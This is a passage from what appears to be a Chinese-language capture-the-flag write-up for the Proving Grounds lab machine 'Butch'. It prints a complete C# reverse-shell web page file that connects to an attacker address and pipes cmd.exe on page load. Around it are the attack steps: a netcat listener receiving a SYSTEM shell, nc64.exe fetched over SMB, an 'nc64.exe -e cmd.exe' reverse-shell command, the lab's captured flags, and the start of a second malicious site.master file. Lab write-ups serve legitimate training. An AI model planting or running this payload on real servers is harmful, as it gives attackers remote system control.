+</span></span><span class="line"><span class="cl">							strInput.Append<span class="o">(</span>rdr.ReadLine<span class="o">())</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">							//strInput.Append<span class="o">(</span><span class="s2">&#34;\n&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">							p.StandardInput.WriteLine<span class="o">(</span>strInput<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">							strInput.Remove<span class="o">(</span>0, strInput.Length<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">						<span class="o">}</span>
+</span></span><span class="line"><span class="cl">					<span class="o">}</span>
+</span></span><span class="line"><span class="cl">				<span class="o">}</span>
+</span></span><span class="line"><span class="cl">			<span class="o">}</span>
+</span></span><span class="line"><span class="cl">		<span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		private static void CmdOutputDataHandler<span class="o">(</span>object sendingProcess, DataReceivedEventArgs outLine<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            StringBuilder <span class="nv">strOutput</span> <span class="o">=</span> new StringBuilder<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span>!String.IsNullOrEmpty<span class="o">(</span>outLine.Data<span class="o">))</span>
+</span></span><span class="line"><span class="cl">            <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                try
+</span></span><span class="line"><span class="cl">                <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                    strOutput.Append<span class="o">(</span>outLine.Data<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    streamWriter.WriteLine<span class="o">(</span>strOutput<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    streamWriter.Flush<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">                catch <span class="o">(</span>Exception err<span class="o">)</span> <span class="o">{</span> <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212202100002.png" alt="image-20240212202100002" srcset="/posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212202100002.png?size=small, /posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212202100002.png?size=medium 1.5x, /posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212202100002.png?size=large 2x" data-title="image-20240212202100002" style="--width: 1170px;--aspect-ratio: 1170 / 1074;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>构造恶意文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Web.UI</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Diagnostics</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.ComponentModel</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Linq</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Net</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Net.Sockets</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">MyNamespaceMaster</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">public</span> <span class="kd">partial</span> <span class="k">class</span> <span class="nc">MyClassMaster</span> <span class="p">:</span> <span class="n">MasterPage</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">static</span> <span class="n">StreamWriter</span> <span class="n">streamWriter</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="kd">protected</span> <span class="k">void</span> <span class="n">Page_Load</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">,</span> <span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="n">using</span><span class="p">(</span><span class="n">TcpClient</span> <span class="n">client</span> <span class="p">=</span> <span class="k">new</span> <span class="n">TcpClient</span><span class="p">(</span><span class="s">&#34;192.168.45.164&#34;</span><span class="p">,</span> <span class="m">445</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="n">using</span><span class="p">(</span><span class="n">Stream</span> <span class="n">stream</span> <span class="p">=</span> <span class="n">client</span><span class="p">.</span><span class="n">GetStream</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">				<span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="n">using</span><span class="p">(</span><span class="n">StreamReader</span> <span class="n">rdr</span> <span class="p">=</span> <span class="k">new</span> <span class="n">StreamReader</span><span class="p">(</span><span class="n">stream</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">					<span class="p">{</span>
+</span></span><span class="line"><span class="cl">						<span class="n">streamWriter</span> <span class="p">=</span> <span class="k">new</span> <span class="n">StreamWriter</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">						<span class="n">StringBuilder</span> <span class="n">strInput</span> <span class="p">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">						<span class="n">Process</span> <span class="n">p</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Process</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">						<span class="n">p</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">FileName</span> <span class="p">=</span> <span class="s">&#34;cmd.exe&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">						<span class="n">p</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">CreateNoWindow</span> <span class="p">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">						<span class="n">p</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">UseShellExecute</span> <span class="p">=</span> <span class="kc">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">						<span class="n">p</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">RedirectStandardOutput</span> <span class="p">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">						<span class="n">p</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">RedirectStandardInput</span> <span class="p">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">						<span class="n">p</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">RedirectStandardError</span> <span class="p">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">						<span class="n">p</span><span class="p">.</span><span class="n">OutputDataReceived</span> <span class="p">+=</span> <span class="k">new</span> <span class="n">DataReceivedEventHandler</span><span class="p">(</span><span class="n">CmdOutputDataHandler</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">						<span class="n">p</span><span class="p">.</span><span class="n">Start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">						<span class="n">p</span><span class="p">.</span><span class="n">BeginOutputReadLine</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">						<span class="k">while</span><span class="p">(</span><span class="kc">true</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">						<span class="p">{</span>
+</span></span><span class="line"><span class="cl">							<span class="n">strInput</span><span class="p">.</span><span class="n">Append</span><span class="p">(</span><span class="n">rdr</span><span class="p">.</span><span class="n">ReadLine</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">							<span class="c1">//strInput.Append(&#34;\n&#34;);</span>
+</span></span><span class="line"><span class="cl">							<span class="n">p</span><span class="p">.</span><span class="n">StandardInput</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">strInput</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">							<span class="n">strInput</span><span class="p">.</span><span class="n">Remove</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="n">strInput</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">						<span class="p">}</span>
+</span></span><span class="line"><span class="cl">					<span class="p">}</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="kd">private</span> <span class="kd">static</span> <span class="k">void</span> <span class="n">CmdOutputDataHandler</span><span class="p">(</span><span class="kt">object</span> <span class="n">sendingProcess</span><span class="p">,</span> <span class="n">DataReceivedEventArgs</span> <span class="n">outLine</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">StringBuilder</span> <span class="n">strOutput</span> <span class="p">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(!</span><span class="n">String</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="n">outLine</span><span class="p">.</span><span class="n">Data</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">try</span>
+</span></span><span class="line"><span class="cl">                <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">strOutput</span><span class="p">.</span><span class="n">Append</span><span class="p">(</span><span class="n">outLine</span><span class="p">.</span><span class="n">Data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">streamWriter</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">strOutput</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">streamWriter</span><span class="p">.</span><span class="n">Flush</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">err</span><span class="p">)</span> <span class="p">{</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>测试过程中发现有端口限制，最后采用445端口，成功回连。</p>
+<p>将恶意文件site.master.cs进行上传</p>
+<p><img loading="lazy" src="/posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212205301350.png" alt="image-20240212205301350" srcset="/posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212205301350.png?size=small, /posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212205301350.png?size=medium 1.5x, /posts/provinggrounds-butch/resource/26-W-M-Butch.assets/image-20240212205301350.png?size=large 2x" data-title="image-20240212205301350" style="--width: 1274px;--aspect-ratio: 1274 / 806;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>Kali端启用nc监听445端口，然后刷新Web页面，成功收到回连。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Butch<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nc -nlvp <span class="m">445</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">445</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.45.164<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.225.63<span class="o">]</span> <span class="m">49821</span>
+</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.17763.1217<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;whoami
+</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由于这个连接是基于Web的，存在超时限制，需要建立一个稳定的shell</p>
+<p>由于有端口限制，因此选择Kali侧开启smb服务进行文件传输</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/tools/win<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ impacket-smbserver share <span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span> -smb2support
+</span></span><span class="line"><span class="cl">Impacket v0.10.0 - Copyright <span class="m">2022</span> SecureAuth Corporation
+</span></span><span class="line"><span class="cl">……</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Windows端接收文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">C:<span class="se">\t</span>mp&gt;copy <span class="se">\\</span>192.168.45.164<span class="se">\s</span>hare<span class="se">\n</span>c64.exe .
+</span></span><span class="line"><span class="cl">        <span class="m">1</span> file<span class="o">(</span>s<span class="o">)</span> copied.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\t</span>mp&gt;dir
+</span></span><span class="line"><span class="cl"> Volume in drive C has no label.
+</span></span><span class="line"><span class="cl"> Volume Serial Number is D4C7-EAE0
+</span></span><span class="line"><span class="cl"> Directory of C:<span class="se">\t</span>mp
+</span></span><span class="line"><span class="cl">02/12/2024  04:46 AM    &lt;DIR&gt;          .
+</span></span><span class="line"><span class="cl">02/12/2024  04:46 AM    &lt;DIR&gt;          ..
+</span></span><span class="line"><span class="cl">12/25/2010  09:31 PM            43,696 nc64.exe
+</span></span><span class="line"><span class="cl">               <span class="m">1</span> File<span class="o">(</span>s<span class="o">)</span>         43,696 bytes
+</span></span><span class="line"><span class="cl">               <span class="m">2</span> Dir<span class="o">(</span>s<span class="o">)</span>  33,599,651,840 bytes free</span></span></code></pre></td></tr></table>
+</div>
+</div><p>再使用nc建立一个稳定的shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">C:<span class="se">\t</span>mp&gt;nc64.exe 192.168.45.164 <span class="m">21</span> -e cmd.exe</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Butch<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nc -nlvp <span class="m">21</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">21</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.45.164<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.225.63<span class="o">]</span> <span class="m">49829</span>
+</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.17763.1217<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\t</span>mp&gt;whoami
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\t</span>mp&gt;powershell
+</span></span><span class="line"><span class="cl">powershell
+</span></span><span class="line"><span class="cl">Windows PowerShell 
+</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; <span class="nb">type</span> C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\p</span>roof.txt
+</span></span><span class="line"><span class="cl"><span class="nb">type</span> C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\p</span>roof.txt
+</span></span><span class="line"><span class="cl">8efb9ecaa9dd953e25de084f5db30648
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; <span class="nb">type</span> C:<span class="se">\u</span>sers<span class="se">\b</span>utch<span class="se">\d</span>esktop<span class="se">\l</span>ocal.txt
+</span></span><span class="line"><span class="cl"><span class="nb">type</span> C:<span class="se">\u</span>sers<span class="se">\b</span>utch<span class="se">\d</span>esktop<span class="se">\l</span>ocal.txt
+</span></span><span class="line"><span class="cl">0f5cfaf654fe39337300f602295effb4
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; </span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="恶意文件2" class="heading-element"><span>恶意文件2</span>
+  <a href="#%e6%81%b6%e6%84%8f%e6%96%87%e4%bb%b62" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>从官方答案中看到的方法，不改 site.master.cs 文件，而是改 site.master。</p>
+<p>创建一个新的 site.master 文件开始。将包含原始文件中的现有内容并附加任意 C# 代码，该代码输出正在运行 Web 应用程序的用户的名称：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="p">&lt;%</span><span class="err">@</span> <span class="n">Language</span><span class="p">=</span><span class="s">&#34;C#&#34;</span> <span class="n">src</span><span class="p">=</span><span class="s">&#34;site.master.cs&#34;</span> <span class="n">Inherits</span><span class="p">=</span><span class="s">&#34;MyNamespaceMaster.MyClassMaster&#34;</span> <span class="p">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;!</span><span class="n">DOCTYPE</span> <span class="n">html</span> <span class="n">PUBLIC</span> <span class="s">&#34;-//W3C//DTD XHTML 1.0 Strict//EN&#34;</span> <span class="s">&#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="n">html</span> <span class="n">xmlns</span><span class="p">=</span><span class="s">&#34;http://www.w3.org/1999/xhtml&#34;</span> <span class="n">lang</span><span class="p">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="n">head</span> <span class="n">runat</span><span class="p">=</span><span class="s">&#34;server&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="n">title</span><span class="p">&gt;</span><span class="n">Butch</span><span class="p">&lt;/</span><span class="n">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="n">meta</span> <span class="n">http</span><span class="p">-</span><span class="n">equiv</span><span class="p">=</span><span class="s">&#34;Content-Type&#34;</span> <span class="n">content</span><span class="p">=</span><span class="s">&#34;text/html; charset=utf-8&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="n">meta</span> <span class="n">name</span><span class="p">=</span><span class="s">&#34;application-name&#34;</span> <span class="n">content</span><span class="p">=</span><span class="s">&#34;Butch&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="n">meta</span> <span class="n">name</span><span class="p">=</span><span class="s">&#34;author&#34;</span> <span class="n">content</span><span class="p">=</span><span class="s">&#34;Butch&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="n">meta</span> <span class="n">name</span><span class="p">=</span><span class="s">&#34;description&#34;</span> <span class="n">content</span><span class="p">=</span><span class="s">&#34;Butch&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="n">meta</span> <span class="n">name</span><span class="p">=</span><span class="s">&#34;keywords&#34;</span> <span class="n">content</span><span class="p">=</span><span class="s">&#34;Butch&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="n">link</span> <span class="n">media</span><span class="p">=</span><span class="s">&#34;all&#34;</span> <span class="n">href</span><span class="p">=</span><span class="s">&#34;style.css&#34;</span> <span class="n">rel</span><span class="p">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="n">type</span><span class="p">=</span><span class="s">&#34;text/css&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="n">link</span> <span class="n">id</span><span class="p">=</span><span class="s">&#34;favicon&#34;</span> <span class="n">rel</span><span class="p">=</span><span class="s">&#34;shortcut icon&#34;</span> <span class="n">type</span><span class="p">=</span><span class="s">&#34;image/png&#34;</span> <span class="n">href</span><span class="p">=</span><span class="s">&#34;favicon.png&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;/</span><span class="n">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="n">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="n">div</span> <span class="n">id</span><span class="p">=</span><span class="s">&#34;wrap&#34;</span><span class="p">&gt;</span>
